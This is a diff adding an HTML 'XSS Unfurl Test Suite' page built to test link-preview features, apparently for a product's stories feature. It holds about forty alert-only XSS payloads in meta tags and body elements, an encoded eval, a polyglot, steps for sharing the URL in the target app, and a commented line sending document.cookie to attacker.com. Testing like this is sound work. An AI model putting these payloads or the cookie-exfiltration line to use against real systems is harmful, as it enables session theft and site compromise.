@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Test 1: XSS in Title Tag -->
+    <title>Test Page<script>alert('XSS-Title')</script></title>
+    
+    <!-- Test 2: XSS in Meta Description -->
+    <meta name="description" content="Description<script>alert('XSS-Meta-Description')</script>">
+    
+    <!-- Test 3: XSS in Meta Keywords -->
+    <meta name="keywords" content="test<script>alert('XSS-Keywords')</script>">
+    
+    <!-- Test 4: XSS in Open Graph Title -->
+    <meta property="og:title" content="OG Title<script>alert('XSS-OG-Title')</script>">
+    
+    <!-- Test 5: XSS in Open Graph Description -->
+    <meta property="og:description" content="OG Description<img src=x onerror=alert('XSS-OG-Desc')>">
+    
+    <!-- Test 6: XSS in Open Graph Image -->
+    <meta property="og:image" content="javascript:alert('XSS-OG-Image')">
+    
+    <!-- Test 7: XSS in Open Graph URL -->
+    <meta property="og:url" content="javascript:alert('XSS-OG-URL')">
+    
+    <!-- Test 8: XSS in Open Graph Site Name -->
+    <meta property="og:site_name" content="Site<svg/onload=alert('XSS-OG-SiteName')>">
+    
+    <!-- Test 9: XSS in Twitter Card Title -->
+    <meta name="twitter:title" content="Twitter<img src=x onerror=alert('XSS-Twitter-Title')>">
+    
+    <!-- Test 10: XSS in Twitter Card Description -->
+    <meta name="twitter:description" content="Twitter Desc<script>alert('XSS-Twitter-Desc')</script>">
+    
+    <!-- Test 11: XSS in Twitter Card Image -->
+    <meta name="twitter:image" content="javascript:alert('XSS-Twitter-Image')">
+    
+    <!-- Test 12: XSS in Canonical URL -->
+    <link rel="canonical" href="javascript:alert('XSS-Canonical')">
+    
+    <!-- Test 13: XSS in Author Meta -->
+    <meta name="author" content="Author<img src=x onerror=alert('XSS-Author')>">
+    
+    <!-- Test 14: Event Handler in Meta -->
+    <meta property="og:title" content="Title" onload="alert('XSS-Meta-Event')">
+    
+    <!-- Test 15: Data URI in OG Image -->
+    <meta property="og:image" content="data:text/html,<script>alert('XSS-Data-URI')</script>">
+    
+    <!-- Test 16: SVG XSS in OG Image -->
+    <meta property="og:image" content="data:image/svg+xml,<svg/onload=alert('XSS-SVG')>">
+    
+    <!-- Test 17: HTML Entities Bypass -->
+    <meta name="description" content="Test&lt;script&gt;alert('XSS-Entities')&lt;/script&gt;">
+    
+    <!-- Test 18: Unicode Bypass -->
+    <meta name="description" content="Test\u003cscript\u003ealert('XSS-Unicode')\u003c/script\u003e">
+    
+    <!-- Test 19: Double Encoding -->
+    <meta name="description" content="Test%253Cscript%253Ealert('XSS-DoubleEncode')%253C/script%253E">
+    
+    <!-- Test 20: CSS Expression (IE) -->
+    <meta property="og:description" content="Test{expression(alert('XSS-CSS'))}">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .test-section {
+            background: white;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .test-section h2 {
+            color: #d32f2f;
+            border-bottom: 2px solid #d32f2f;
+            padding-bottom: 10px;
+        }
+        .payload {
+            background: #f5f5f5;
+            padding: 10px;
+            border-left: 4px solid #d32f2f;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        code {
+            background: #e0e0e0;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        ⚠️ <strong>WARNING:</strong> This page contains XSS test payloads for authorized security testing only.
+        Do not share or deploy this page publicly.
+    </div>
+
+    <h1>🔒 XSS Unfurl Test Suite</h1>
+    <p>This page contains various XSS payloads in meta tags to test unfurl functionality vulnerabilities.</p>
+
+    <!-- Test 21: Body Content with XSS -->
+    <div class="test-section">
+        <h2>Test 21: Body Content XSS</h2>
+        <div class="payload">
+            <script>
+                // If unfurl captures body content
+                alert('XSS-Body-Script');
+            </script>
+        </div>
+    </div>
+
+    <!-- Test 22: Image with Event Handler -->
+    <div class="test-section">
+        <h2>Test 22: Image Event Handler</h2>
+        <img src="invalid.jpg" onerror="alert('XSS-IMG-OnError')" alt="Test">
+    </div>
+
+    <!-- Test 23: SVG with OnLoad -->
+    <div class="test-section">
+        <h2>Test 23: SVG OnLoad</h2>
+        <svg/onload=alert('XSS-SVG-OnLoad')>
+    </div>
+
+    <!-- Test 24: Iframe with JavaScript URL -->
+    <div class="test-section">
+        <h2>Test 24: Iframe JavaScript URL</h2>
+        <iframe src="javascript:alert('XSS-Iframe')"></iframe>
+    </div>
+
+    <!-- Test 25: Link with JavaScript URL -->
+    <div class="test-section">
+        <h2>Test 25: Link JavaScript URL</h2>
+        <a href="javascript:alert('XSS-Link')">Click me</a>
+    </div>
+
+    <!-- Test 26: Input with Autofocus -->
+    <div class="test-section">
+        <h2>Test 26: Input Autofocus XSS</h2>
+        <input autofocus onfocus="alert('XSS-Input-Focus')">
+    </div>
+
+    <!-- Test 27: Div with ContentEditable -->
+    <div class="test-section">
+        <h2>Test 27: ContentEditable XSS</h2>
+        <div contenteditable="true" oninput="alert('XSS-ContentEditable')">Edit me</div>
+    </div>
+
+    <!-- Test 28: Details/Summary XSS -->
+    <div class="test-section">
+        <h2>Test 28: Details Toggle XSS</h2>
+        <details ontoggle="alert('XSS-Details')">
+            <summary>Click to expand</summary>
+        </details>
+    </div>
+
+    <!-- Test 29: Marquee Tag -->
+    <div class="test-section">
+        <h2>Test 29: Marquee XSS</h2>
+        <marquee onstart="alert('XSS-Marquee')">Scrolling text</marquee>
+    </div>
+
+    <!-- Test 30: Video/Audio with Event -->
+    <div class="test-section">
+        <h2>Test 30: Media Element XSS</h2>
+        <video><source onerror="alert('XSS-Video')"></video>
+        <audio src="x" onerror="alert('XSS-Audio')"></audio>
+    </div>
+
+    <!-- Test 31: Object/Embed Tags -->
+    <div class="test-section">
+        <h2>Test 31: Object/Embed XSS</h2>
+        <object data="javascript:alert('XSS-Object')"></object>
+        <embed src="javascript:alert('XSS-Embed')">
+    </div>
+
+    <!-- Test 32: Base Tag Hijacking -->
+    <div class="test-section">
+        <h2>Test 32: Base Tag XSS</h2>
+        <!-- <base href="javascript:alert('XSS-Base')"> -->
+    </div>
+
+    <!-- Test 33: Form with Action -->
+    <div class="test-section">
+        <h2>Test 33: Form Action XSS</h2>
+        <form action="javascript:alert('XSS-Form')">
+            <button>Submit</button>
+        </form>
+    </div>
+
+    <!-- Test 34: Meta Refresh XSS -->
+    <div class="test-section">
+        <h2>Test 34: Meta Refresh</h2>
+        <!-- Uncomment to test: -->
+        <!-- <meta http-equiv="refresh" content="0;url=javascript:alert('XSS-Refresh')"> -->
+    </div>
+
+    <!-- Test 35: Link with Import -->
+    <div class="test-section">
+        <h2>Test 35: Link Import XSS</h2>
+        <!-- <link rel="import" href="javascript:alert('XSS-Import')"> -->
+    </div>
+
+    <div class="test-section">
+        <h2>📋 Unfurl Testing Instructions</h2>
+        <ol>
+            <li>Deploy this HTML file to a web server</li>
+            <li>Share the URL in your application's chat/story feature</li>
+            <li>Observe if any XSS payloads execute during unfurl preview generation</li>
+            <li>Check both server-side unfurl and client-side rendering</li>
+            <li>Test with various content types in Accept headers</li>
+        </ol>
+    </div>
+
+    <div class="test-section">
+        <h2>🎯 Key Areas to Check in Unfurl Code</h2>
+        <ul>
+            <li><code>og:title</code> - Often displayed without sanitization</li>
+            <li><code>og:description</code> - May allow HTML</li>
+            <li><code>og:image</code> - Check for javascript: protocol</li>
+            <li><code>meta description</code> - Legacy fallback</li>
+            <li><code>&lt;title&gt;</code> - Page title extraction</li>
+            <li>Body content parsing - First paragraph detection</li>
+        </ul>
+    </div>
+
+    <div class="test-section">
+        <h2>🔍 Specific Tests for Cliq Stories Unfurl</h2>
+        <p>Based on the code analysis, test these scenarios:</p>
+        <div class="payload">
+            // StoriesManager.getUnfurledDetailsFromCaption()
+            // Tests if caption URL unfurl is vulnerable
+            
+            Test URL: http://your-server.com/xss-unfurl-test.html#test1
+        </div>
+        <div class="payload">
+            // Check if og:title is properly sanitized in Story.java
+            Expected vulnerable path: caption → unfurl → og:title → display
+        </div>
+    </div>
+
+    <!-- Test 36: Template Literal Injection -->
+    <div class="test-section">
+        <h2>Test 36: Template Literal</h2>
+        <meta property="og:title" content="Title${alert('XSS-Template')}">
+    </div>
+
+    <!-- Test 37: Style Tag Injection -->
+    <div class="test-section">
+        <h2>Test 37: Style Injection</h2>
+        <style>
+            body {
+                background: url('javascript:alert("XSS-Style")');
+            }
+        </style>
+    </div>
+
+    <!-- Test 38: Script with Encoded Payload -->
+    <div class="test-section">
+        <h2>Test 38: Encoded Script</h2>
+        <script>eval(atob('YWxlcnQoJ1hTUy1CYXNlNjQnKQ=='))</script>
+        <!-- Decodes to: alert('XSS-Base64') -->
+    </div>
+
+    <!-- Test 39: Mutation XSS -->
+    <div class="test-section">
+        <h2>Test 39: mXSS</h2>
+        <noscript><p title="</noscript><img src=x onerror=alert('XSS-mXSS')>"></noscript>
+    </div>
+
+    <!-- Test 40: Polyglot Payload -->
+    <div class="test-section">
+        <h2>Test 40: Polyglot XSS</h2>
+        <meta name="description" content='javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>'>
+    </div>
+
+    <script>
+        // Test 41: DOM-based XSS
+        document.write("Test DOM XSS");
+        
+        // Test 42: Fetch API to external domain
+        // fetch('https://attacker.com/steal?data=' + document.cookie);
+        
+        console.log('XSS Test Page Loaded');
+        console.log('Total meta tags:', document.querySelectorAll('meta').length);
+    </script>
+</body>
+</html>
